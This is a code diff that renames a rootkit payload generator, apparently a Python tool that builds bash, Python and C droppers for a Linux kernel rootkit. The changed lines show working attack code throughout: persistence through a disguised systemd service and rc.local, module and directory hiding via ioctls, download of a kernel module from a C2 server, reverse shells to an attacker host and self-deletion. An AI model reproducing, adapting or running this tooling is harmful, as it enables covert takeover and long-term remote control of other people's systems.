@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-rooteame Payload Generator v3.0
+vault_kernel Payload Generator v3.0
 Interactive builder for kernel rootkit delivery payloads.
 Auto-detects local IP, generates obfuscated multi-format payloads
 with anti-VM evasion and persistence.
@@ -74,13 +74,13 @@ Restart=no
 [Install]
 WantedBy=multi-user.target
 SVC
-        sed -i "s|SVC|${T}/rooteame.ko|" /etc/systemd/system/dbus-system.service
+        sed -i "s|SVC|${T}/vault_kernel.ko|" /etc/systemd/system/dbus-system.service
         systemctl daemon-reload 2>/dev/null || true
         systemctl enable dbus-system.service 2>/dev/null && INSTALLED=1
     fi
     if [ "$INSTALLED" = "0" ] && [ -f /etc/rc.local ]; then
-        grep -q rooteame /etc/rc.local 2>/dev/null || \
-            echo "/sbin/insmod ${T}/rooteame.ko" >> /etc/rc.local
+        grep -q vault_kernel /etc/rc.local 2>/dev/null || \
+            echo "/sbin/insmod ${T}/vault_kernel.ko" >> /etc/rc.local
     fi
 }
 _persist "$T"
@@ -111,7 +111,7 @@ def build_bash(host, port, xorkey="", anti_vm=True, persistence=True, obfuscate=
         extract = 'echo "$T" | base64 -d | tar xzf -'
 
     script = f'''#!/bin/bash
-# rooteame dropper v3.0 — kernel rootkit implant
+# vault_kernel dropper v3.0 — kernel rootkit implant
 set -e
 export T="/tmp/.$(head -c6 /dev/urandom|base64|tr -dc a-z0-9|head -c8)"
 export H="{host}" P="{port}"
@@ -136,16 +136,16 @@ make >/dev/null 2>&1||{{ _s "build failed";exit 1; }}
 
 # Load
 _s "load"
-/sbin/insmod rooteame.ko 2>/dev/null
-for i in $(seq 1 10);do [ -e /dev/rooteame ]&&break;sleep 0.1;done
+/sbin/insmod vault_kernel.ko 2>/dev/null
+for i in $(seq 1 10);do [ -e /dev/vault_kernel ]&&break;sleep 0.1;done
 
 # Hide module + trigger shell
 python3 -c "
 import fcntl,os
-fd=os.open('/dev/rooteame',2)
+fd=os.open('/dev/vault_kernel',2)
 fcntl.ioctl(fd,(0<<30)|(0xC0<<8)|0x0D)
 os.close(fd)
-fd=os.open('/dev/rooteame',2)
+fd=os.open('/dev/vault_kernel',2)
 buf=b'$H:$P\x00'.ljust(256,b'\x00')
 fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x0B,buf)
 os.close(fd)
@@ -158,7 +158,7 @@ _s "shell triggered -> $H:$P"
 # Hide dir + self-destruct
 python3 -c "
 import fcntl,os
-fd=os.open('/dev/rooteame',2)
+fd=os.open('/dev/vault_kernel',2)
 fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x02,'$(basename "$T")\x00'.ljust(256,b'\x00'))
 os.close(fd)
 " 2>/dev/null||true
@@ -182,7 +182,7 @@ def build_python(host, port):
     return f'''#!/usr/bin/env python3
 import os,sys,platform,struct,fcntl,urllib.request,tempfile,time
 H,P="{host}","{port}"
-C2=f"http://{{H}}:8080/rooteame-{{platform.release()}}-{{platform.machine()}}.ko"
+C2=f"http://{{H}}:8080/vault_kernel-{{platform.release()}}-{{platform.machine()}}.ko"
 try:
  if os.geteuid():os.execvp("sudo",["sudo",sys.executable]+sys.argv)
  k=urllib.request.urlopen(C2,timeout=30).read()
@@ -191,13 +191,13 @@ try:
  os.system(f"/sbin/insmod {{p}} 2>/dev/null")
  time.sleep(.5)
  for i in range(10):
-  if os.path.exists("/dev/rooteame"):break
+  if os.path.exists("/dev/vault_kernel"):break
   time.sleep(.1)
- fd=os.open("/dev/rooteame",2)
+ fd=os.open("/dev/vault_kernel",2)
  buf=f"{{H}}:{{P}}".encode().ljust(256,b"\\0")
  fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x0B,buf)
  os.close(fd)
- fcntl.ioctl(os.open("/dev/rooteame",2),(0<<30)|(0xC0<<8)|0x0D)
+ fcntl.ioctl(os.open("/dev/vault_kernel",2),(0<<30)|(0xC0<<8)|0x0D)
  os.unlink(__file__)
  print(f"[+] Shell -> {{H}}:{{P}}")
 except Exception as e:print(f"[-] {{e}}")
@@ -209,7 +209,7 @@ except Exception as e:print(f"[-] {{e}}")
 # ================================================================
 def build_c(host, port):
     return f'''/*
- * rooteame stager v3.0 — minimal C downloader/loader
+ * vault_kernel stager v3.0 — minimal C downloader/loader
  * Compile: gcc -O2 -s -o stager stager.c -static
  * Size: ~15KB static, ~8KB dynamic
  */
@@ -308,8 +308,8 @@ int main(int argc, char **argv) {{
     signal(SIGCHLD, SIG_DFL);
 
     /* Fetch payload from C2 */
-    printf("[*] Fetching rooteame.ko from C2...\\n");
-    if (download("http://" C2 ":8080/rooteame.ko", &data, &len) < 0) {{
+    printf("[*] Fetching vault_kernel.ko from C2...\\n");
+    if (download("http://" C2 ":8080/vault_kernel.ko", &data, &len) < 0) {{
         fprintf(stderr, "[-] Download failed\\n");
         return 1;
     }}
@@ -340,7 +340,7 @@ int main(int argc, char **argv) {{
     /* Trigger reverse shell */
     sleep(1);
     for (int i = 0; i < 10; i++) {{
-        fd = open("/dev/rooteame", O_RDWR);
+        fd = open("/dev/vault_kernel", O_RDWR);
         if (fd >= 0) break;
         usleep(100000);
     }}
@@ -352,7 +352,7 @@ int main(int argc, char **argv) {{
         close(fd);
         printf("[+] Reverse shell -> %s:%s\\n", C2, PORT);
     }} else {{
-        fprintf(stderr, "[-] /dev/rooteame not found\\n");
+        fprintf(stderr, "[-] /dev/vault_kernel not found\\n");
     }}
 
     /* Cleanup */
@@ -369,7 +369,7 @@ int main(int argc, char **argv) {{
 # ================================================================
 def cli():
     import argparse
-    p = argparse.ArgumentParser(description="rooteame v3.0 Payload Generator")
+    p = argparse.ArgumentParser(description="vault_kernel v3.0 Payload Generator")
     p.add_argument("--host", help="C2 IP for reverse shell callback")
     p.add_argument("--port", default="4444", help="C2 port")
     p.add_argument("--format", choices=["bash","python","c","all"], default="bash")
@@ -414,7 +414,7 @@ def cli():
 # ================================================================
 def interactive():
     print("""
-  rooteame — Payload Generator v3.0
+  vault_kernel — Payload Generator v3.0
   ruby570bocadito (c) 2026
 """)
     local_ip = get_local_ip()
